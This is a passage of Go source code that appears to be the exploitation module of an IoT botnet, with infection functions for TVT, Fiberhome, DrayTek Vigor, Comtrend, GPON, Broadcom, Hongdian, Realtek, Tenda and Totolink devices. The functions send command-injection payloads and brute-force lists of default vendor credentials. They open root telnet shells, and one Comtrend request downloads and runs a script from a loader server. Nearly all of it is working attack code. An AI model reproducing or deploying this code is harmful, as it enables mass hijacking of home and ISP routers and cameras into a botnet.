		stackOffset := retval + 0x7fd3d8 + 20
		ucSendBof(target, stackOffset)
		break
	}

	for i := 0; i < pidsFound; i++ {
		pidStrs[i] = ""
	}

	zeroByte(buf)
	zeroByte(tmp)
	time.Sleep(10 * time.Second)
	return
}

func infectFunctionTvt(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	/* TVT4567 check */
	go func() {
		ipslit := strings.Split(target, ":")
		tmpconn, err := net.DialTimeout("tcp", ipslit[0]+":4567", 10*time.Second)
		if err == nil {
			infectFunctionTvt4567(target, tmpconn)
		}

		return
	}()
	/* ////////////// */

	payload := "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType><addressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$("
	payload += tvtWebPayload
	payload += ")</ip></item></filterList></content></request>"

	cntlen := strconv.Itoa(len(payload))

	conn.Write([]byte("POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: " + cntlen + "\r\nAccept-Language: en-us\r\nHost: " + target + "\r\nAccept: */*\r\nUser-Agent: " + userAgent + "\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n" + payload + "\r\n\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "<status>success</status>") {
			fmt.Printf("\x1b[38;5;46mTvt\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
			payloadSent++

			logDevice(target, "tvt")
			break
		}
	}

	conn.Close()
	time.Sleep(10 * time.Second)
}

func infectFunctionFiberhome(target string) {

	var (
		rdbuf      []byte = []byte("")
		authed     int    = 0
		telnetPort int    = 0
	)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	conn.Write([]byte("POST /goform/webLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 23\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/login_inter.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nUser=admin&Passwd=admin\r\n\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)

		if ln <= 0 || err != nil {
			break
		}
		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "Set-Cookie: loginName=admin") {
			authed = 1
			break
		}

		conn.Close()

		if authed == 0 {
			continue
		}

		conn, err = net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			continue
		}

		conn.Write([]byte("GET /menu_inter.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://" + target + "/login_inter.asp\r\nConnection: keep-alive\r\nCookie: loginName=admin\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)

			if strings.Contains(string(rdbuf), "Set-Cookie: loginName=admin") {
				authed = 1
				break
			}
		}

		conn.Close()

		if fiberRandPort == 1 {
			rand.Seed(time.Now().UnixNano())
			telnetPort = rand.Intn(50000) + 10000
		} else {
			telnetPort = fiberStaticPort
		}

		for i := 0; i < len(fiberSecStrs); i++ {
			conn, err = net.DialTimeout("tcp", target, 10*time.Second)
			if err != nil {
				return
			}

			conn.Write([]byte("GET /goform/setPing?ping_ip=;telnetd%20-l/bin/sh%20-p" + strconv.Itoa(telnetPort) + "&requestNum=" + strconv.Itoa(i+1) + "&diagtype=1&" + fiberSecStrs[i] + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: loginName=admin\r\n\r\n"))

			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				conn.Close()
				break
			}

			conn.Close()

			if !strings.Contains(string(rdbuf), "200 OK") {
				return
			}
		}

		time.Sleep(3 * time.Second)

		ipslit := strings.Split(target, ":")

		conn, err = net.DialTimeout("tcp", ipslit[0]+":"+strconv.Itoa(telnetPort), 10*time.Second)
		if err == nil {
			fmt.Printf("\x1b[38;5;46mFiberhome:admin:admin\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m telnet shell opened\x1b[38;5;15m\r\n", target)
			go telnetLoader(ipslit[0]+":"+strconv.Itoa(telnetPort), 0, "mips", loaderFiberhomeTag, "pkill -9 telnetd; killall telnetd")
			conn.Close()

			logDevice(target, "fiberhome")
			return
		}

	}
}

func infectFunctionVigor(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	payload := "action=login&keyPath=%27%0A%09%2F"
	payload += vigorPayload
	payload += "%27%0A%09%27&loginPwd=a&loginUser=a"
	cntlen := strconv.Itoa(len(payload))

	conn.Write([]byte("POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntlen + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\n" + payload + "\r\n\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "HTTP/1.1 200 OK") {
			fmt.Printf("\x1b[38;5;46mVigor\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
			payloadSent++
			break
		}
	}

	conn.Close()
}

func infectFunctionComtrend(target string) {

	var (
		rdbuf      []byte = []byte("")
		state             = 0
		sessionKey        = "null"
	)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /pingview.cmd HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic cm9vdDoxMjM0NQ==\r\nConnection: close\r\nReferer: http://" + target + "/left.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "&sessionKey=") && strings.Contains(string(rdbuf), "var code = 'location=") && state != 1 {
			sessionKey = getStringInBetween(string(rdbuf), "   loc += '&sessionKey=", "';\n}\n\nvar code = 'location=\"' + loc + '\"';\n")

			if sessionKey == "null" {
				break
			}

			conn.Close()
			conn, err = net.DialTimeout("tcp", target, 10*time.Second)
			if err != nil {
				return
			}

			conn.Write([]byte("GET /ping.cgi?pingIpAddress=;cd%20/mnt;wget%20http://" + LoaderDownloadServer + "/multi/1.sh%20-O-%20>sfs;chmod%20777%20sfs;sh%20sfs%20" + loaderComtrendTag + ";&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic cm9vdDoxMjM0NQ==\r\nConnection: close\r\nReferer: http://" + target + "/ping.cgi\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
			state = 1
		} else if state == 1 {
			if strings.Contains(string(rdbuf), "function btnPing()") {
				fmt.Printf("\x1b[38;5;46mComtrend\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
				payloadSent++
				conn.Close()
				return
			}
		}
	}

	conn.Close()
}

func gponFiberCheck(target string) bool {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /admin/login.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "/boaform/admin/formLogin") {
			return true
		}
	}

	return false
}

func infectFunctionGponFiber(target string) {

	var (
		rdbuf  []byte   = []byte("")
		logins []string = []string{"user:user", "adminisp:adminisp", "admin:stdONU101", "manu:eceb88d1", "e8c:cd16857l", "e8c:cd16857lkv19", "e8c:e8c", "admin:optilink", "admin:stdONUi0i", "adminpldt:pldt1234", "telecomadmin:G3p0n#n3t", "manu:3133938d", "manu:51297937", "superadmin:slhf1brpf", "admin:Radinet@555", "superadmin:superadmin", "manu:c2", "adminpldt:z6dUABtl270qRxt7a2uGTiw", "adminpldt:6GFJdY4aAuUKJjdtSn7dC2x", "telecomadmin:admintelecom", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "admin:password", "default:default", "admin:admin123", "admin:password123", "admin:123admin", "admin:root", "admin:1234567890", "admin:qwertyuiop", "admin:zxcvbnm", "admin:minda", "admin:1234", "admin:12345", "admin:1234567", "admin:12345678", "admin:123456789", "root:admin", "user:user1234", "f~i!b@e#r$h%o^m*esuperadmin:s(f)u_h+g|u", "telecomadmin:nE7jA%5m", "adminpldt:z6dUABtl270qRxt7a2uGTiw", "gestionteleburcaramanga:t3l3buc4r4m4ng2013", "rootmet:m3tr0r00t", "awnfibre:fibre@dm!n", "trueadmin:admintrue", "admin:GOR2U1P2ag", "admin:3UJUh2VemEfUtesEchEC2d2e", "admin:888888", "useradmin:888888", "user:888888", "admin:1234", "user:tattoo@home", "admin:tele1234", "admin:aisadmin", "admin:Inadmin", "admin:CUadmin", "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default"}
		//logins []string = []string{"adminpldt:1234567890", "admin:stdONU101", "manu:eceb88d1", "e8c:cd16857l", "e8c:cd16857lkv19", "e8c:e8c", "admin:optilink", "admin:stdONUi0i", "adminisp:adminisp", "adminpldt:pldt1234", "telecomadmin:G3p0n#n3t", "manu:3133938d", "manu:51297937", "superadmin:slhf1brpf", "admin:Radinet@555", "superadmin:superadmin", "manu:c2", "adminpldt:z6dUABtl270qRxt7a2uGTiw", "adminpldt:6GFJdY4aAuUKJjdtSn7dC2x", "telecomadmin:admintelecom", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:admin123", "admin:password123", "admin:123admin", "admin:root", "admin:1234567890", "admin:qwertyuiop", "admin:zxcvbnm", "admin:minda", "admin:1234", "admin:12345", "admin:1234567", "admin:12345678", "admin:123456789", "root:admin", "user:user1234", "f~i!b@e#r$h%o^m*esuperadmin:s(f)u_h+g|u", "admin:stdONU101", "telecomadmin:nE7jA%5m","adminpldt:z6dUABtl270qRxt7a2uGTiw","gestionteleburcaramanga:t3l3buc4r4m4ng2013","rootmet:m3tr0r00t","awnfibre:fibre@dm!n","trueadmin:admintrue","admin:GOR2U1P2ag","admin:3UJUh2VemEfUtesEchEC2d2e","admin:888888","useradmin:888888","user:888888","admin:1234","user:tattoo@home","admin:tele1234","admin:aisadmin", "admin:Inadmin", "admin:CUadmin", "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default"}
		stage = 0
	)

	if !gponFiberCheck(target) {
		return
	}

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	for i := 0; i < len(logins); i++ {
		loginSplit := strings.Split(logins[i], ":")

		conn, err := net.DialTimeout("tcp", target, 60*time.Second)
		if err != nil {
			return
		}

		cntlen := 14
		cntlen = len(loginSplit[0])
		cntlen = len(loginSplit[1])

		conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntlen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))

		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			if strings.Contains(string(rdbuf), "ERROR:bad password!") {
				zeroByte(rdbuf)
				break
			} else if (strings.Contains(string(rdbuf), "HTTP/1.0 302 Moved Temporarily") || strings.Contains(string(rdbuf), "ERROR:you have logined!")) && stage != 1 {
				conn.Close()
				conn, err := net.DialTimeout("tcp", target, 60*time.Second)
				if err != nil {
					return
				}

				cntlen := strconv.Itoa(len(gponFiberPayload))

				conn.Write([]byte("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntlen + "\r\nOrigin: http://" + target + "\r\nConnection: close\r\nReferer: http://" + target + "/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n" + gponFiberPayload + "\r\n\r\n"))
				stage = 1
				zeroByte(rdbuf)
				continue
			} else if stage == 1 {
				if strings.Contains(string(rdbuf), "value=\"  OK  \"") {
					fmt.Printf("\x1b[38;5;46mGponFiber\x1b[38;5;15m: \x1b[38;5;134m%s:%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, loginSplit[0], loginSplit[1])
					conn.Close()
					payloadSent++
					return
				}
			}
		}

		conn.Close()
	}

	conn.Close()
}

func infectFunctionBroadcomSessionKey(target string, auth string) string {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return ""
	}

	defer conn.Close()
	conn.Write([]byte("GET /ping.html HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html\r\nReferer: http://" + target + "/menu.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

	for {
		bytebuf := make([]byte, 256)
		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			return ""
		}

		if strings.Contains(string(bytebuf), "pingHost.cmd") && strings.Contains(string(bytebuf), "&sessionKey=") {
			index1 := strings.Index(string(bytebuf), "&sessionKey=")
			index2 := strings.Index(string(bytebuf)[index1+len("&sessionKey="):], "';")
			sessionKey := string(bytebuf)[index1+len("&sessionKey=") : index1+len("&sessionKey=")+index2]
			return sessionKey
		}
	}

	return ""
}

func infectFunctionBroadcom(target string) {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nCache-Control: max-age=0\r\nAuthorization: Basic c3VwcG9ydDpzdXBwb3J0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

	bytebuf := make([]byte, 64)
	rdlen, err := conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		conn.Close()
		return
	}

	conn.Close()

	if !strings.Contains(string(bytebuf), "HTTP/1.1 200 Ok\r\nServer: micro_httpd") {
		return
	}

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	sessionKey := infectFunctionBroadcomSessionKey(target, "c3VwcG9ydDpzdXBwb3J0")
	conn.Write([]byte("GET /sntpcfg.cgi?ntp_enabled=1&ntpServer1=" + broadcomPayload + "&ntpServer2=&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=-05:00&timezone=XXX+5YYY,M3.2.0/02:00:00,M11.1.0/02:00:00&tzArray_index=13&use_dst=0&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic c3VwcG9ydDpzdXBwb3J0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html\r\nReferer: http://" + target + "/sntpcfg.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

	bytebuf = make([]byte, 256)
	rdlen, err = conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		return
	}

	conn.Close()

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	sessionKey = infectFunctionBroadcomSessionKey(target, "c3VwcG9ydDpzdXBwb3J0")
	conn.Write([]byte("GET /pingHost.cmd?action=add&targetHostAddress=;ps|sh&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic c3VwcG9ydDpzdXBwb3J0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html\r\nReferer: http://" + target + "/ping.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

	bytebuf = make([]byte, 256)
	rdlen, err = conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		return
	}

	conn.Close()

	if !strings.Contains(string(bytebuf), "COMPLETED") {
		fmt.Printf("\x1b[38;5;46mBroadcom\x1b[38;5;15m: \x1b[38;5;134m%s:%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, "support", "support")
		return
	}

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	sessionKey = infectFunctionBroadcomSessionKey(target, "c3VwcG9ydDpzdXBwb3J0")
	conn.Write([]byte("GET /sntpcfg.cgi?ntp_enabled=1&ntpServer1=time.nist.gov&ntpServer2=&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=-05:00&timezone=XXX+5YYY,M3.2.0/02:00:00,M11.1.0/02:00:00&tzArray_index=13&use_dst=0&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic c3VwcG9ydDpzdXBwb3J0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html\r\nReferer: http://" + target + "/sntpcfg.html\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))

	bytebuf = make([]byte, 256)
	rdlen, err = conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		return
	}

	conn.Close()
}

func hongdianLoadTelnet(target string) {
	ip := strings.Split(target, ":")[0]

	conn, err := net.DialTimeout("tcp", ip+":5188", timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	if !telnetRead(conn, ":") {
		return
	}

	fmt.Printf("\x1b[38;5;46mHongdian\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m found telnet\x1b[38;5;15m\r\n", target)

	conn.Write([]byte("root\r\n"))

	if !telnetRead(conn, ":") {
		return
	}

	conn.Write([]byte("superzxmn\r\n"))

	if !telnetRead(conn, "#") {
		return
	}

	fmt.Printf("\x1b[38;5;46mHongdian\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", target)

	conn.Write([]byte(hongdianTelnetPayload + "\r\n"))

	if !telnetRead(conn, executeMessage) {
		return
	}

	fmt.Printf("\x1b[38;5;46mHongdian\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
}

func infectFunctionHongdian(target string) {

	/*
	   var (
	       rdbuf []byte = []byte("")
	       logins []string = []string{"admin:admin", "admin:1234", "admin:12345", "admin:123456", "admin:54321", "admin:password", "admin:", "admin:admin123"}
	   )
	*/

	hongdianLoadTelnet(target)

	/*
	   for i := 0; i < len(logins); i++ {
	       conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
	       if err != nil {
	           return
	       }

	       authStr := base64.StdEncoding.EncodeToString([]byte(logins[i]))
	       conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAuthorization: Basic " + authStr + "\r\nConnection: close\r\n\r\n"))

	       for {
	           tmpbuf := make([]byte, 128)
	           ln, err := conn.Read(tmpbuf)
	           if ln <= 0 || err != nil {
	               break
	           }

	           rdbuf = append(rdbuf, tmpbuf...)
	           if strings.Contains(string(rdbuf), "HTTP/1.1 200 OK") {
	               conn.Close()

	               conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
	               if err != nil {
	                   return
	               }

	               payload := "op_type=ping&destination=%3B"
	               payload += hongdianPayload
	               payload += "&user_options="
	               cntlen := strconv.Itoa(len(payload))

	               conn.Write([]byte("POST /tools.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\Content-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntlen + "\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + authStr + "\r\nConnection: close\r\nReferer: http://" + target + "/tools.cgi\r\nUpgrade-Insecure-Requests: 1\r\n\r\n" + payload + "\r\n\r\n"))
	               zeroByte(rdbuf)

	               for {
	                   tmpbuf := make([]byte, 128)
	                   ln, err := conn.Read(tmpbuf)
	                   if ln <= 0 || err != nil {
	                       break
	                   }

	                   rdbuf = append(rdbuf, tmpbuf...)
	                   if strings.Contains(string(rdbuf), "HTTP/1.1 200 OK") && strings.Contains(string(rdbuf), "/themes/oem.css") {
	                       fmt.Printf("\x1b[38;5;46mHongdian\x1b[38;5;15m: \x1b[38;5;134m%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, logins[i])
	                       conn.Close()
	                       payloadSent++
	                       return
	                   }
	               }

	               conn.Close()
	               return
	           } else if strings.Contains(string(rdbuf), "HTTP/1.1 401 Unauthorized") {
	               break
	           }
	       }

	       zeroByte(rdbuf)
	       conn.Close()
	   }
	*/
}

func infectFunctionRealtek(target string) {

	var (
		rdbuf  []byte   = []byte("")
		logins []string = []string{"admin:admin", "admin:1234", "admin:12345", "admin:123456", "admin:54321", "admin:password", "admin:", "admin:admin123"}
	)

	for i := 0; i < len(logins); i++ {
		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			return
		}

		authStr := base64.StdEncoding.EncodeToString([]byte(logins[i]))
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAuthorization: Basic " + authStr + "\r\nConnection: close\r\n\r\n"))

		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			if strings.Contains(string(rdbuf), "HTTP/1.1 200") {
				conn.Close()

				conn, err = net.DialTimeout("tcp", target, 10*time.Second)
				if err != nil {
					return
				}

				payload := "submit-url=%2Fsyscmd.htm&sysCmd=ping&sysMagic=&sysCmdType=ping&checkNum=1&sysHost=%3Btelnetd%20-l/bin/sh%20-p31443&apply=Apply&msg=boa.conf%0D%0Amime.types%0D%0A"
				cntlen := strconv.Itoa(len(payload))

				conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + cntlen + "\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + authStr + "\r\nConnection: close\r\nReferer: http://" + target + "/syscmd.htm\r\nUpgrade-Insecure-Requests: 1\r\n\r\n" + payload + "\r\n\r\n"))
				zeroByte(rdbuf)

				for {
					tmpbuf := make([]byte, 128)
					ln, err := conn.Read(tmpbuf)
					if ln <= 0 || err != nil {
						break
					}

					rdbuf = append(rdbuf, tmpbuf...)
					if strings.Contains(string(rdbuf), "Redirect") && strings.Contains(string(rdbuf), "/syscmd.htm") {
						time.Sleep(10 * time.Second)

						ipslit := strings.Split(target, ":")
						tmpconn, err := net.DialTimeout("tcp", ipslit[0]+":31443", 10*time.Second)
						if err == nil {
							fmt.Printf("\x1b[38;5;46mRealtek\x1b[38;5;15m: \x1b[38;5;134m%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, logins[i])
							tmpconn.Close()
						}

						conn.Close()
						payloadSent++
						return
					}
				}

				conn.Close()
				return
			} else if strings.Contains(string(rdbuf), "HTTP/1.1 401") {
				break
			}
		}

		zeroByte(rdbuf)
		conn.Close()
	}
}

func infectFunctionTenda(target string) {

	var rdbuf []byte = []byte("")

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	conn.Write([]byte("GET /goform/setUsbUnload/.js?deviceName=A;" + tendaPayload + " HTTP/1.1\r\nHost: " + target + "\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "HTTP/1.0 200 OK") && strings.Contains(string(rdbuf), "{\"errCode\":0}") {
			fmt.Printf("\x1b[38;5;46mTenda\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
			payloadSent++
			break
		}
	}

	conn.Close()
}

func infectFunctionTotolink(target string) {

	var (
		rdbuf  []byte   = []byte("")
		logins []string = []string{"admin:admin", "admin:Soportehfc", "Soportehfc:Soportehfc", "admin:soportehfc", "soportehfc:soportehfc"}
	)

	for i := 0; i < len(logins); i++ {
		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			return
		}

		authStr := base64.StdEncoding.EncodeToString([]byte(logins[i]))
		payload := "submit-url=%2Fsyscmd.htm&sysCmdselect=5&sysCmdselects=0&save_apply=Run+Command&sysCmd="
		payload += totolinkPayload
		cntlen := strconv.Itoa(len(payload))

		conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + authStr + "\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nContent-Length: " + cntlen + "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" + payload + "\r\n\r\n"))

		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			if strings.Contains(string(rdbuf), "Location: http://"+target+"/syscmd.htm") {
				fmt.Printf("\x1b[38;5;46mTotolink\x1b[38;5;15m: \x1b[38;5;134m%s:%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target, logins[i])
				payloadSent++
				break
			}
		}

		zeroByte(rdbuf)
		conn.Close()
	}
}

/*
func infectFunctionZyxel(target string) {

    var rdbuf []byte = []byte("")

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }

    //conn.Write([]byte("GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3B" + zyxelPayload + "+%23&password=asdf HTTP/1.1\r\nHost: " + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: " + userAgent + "\r\n\r\n"))
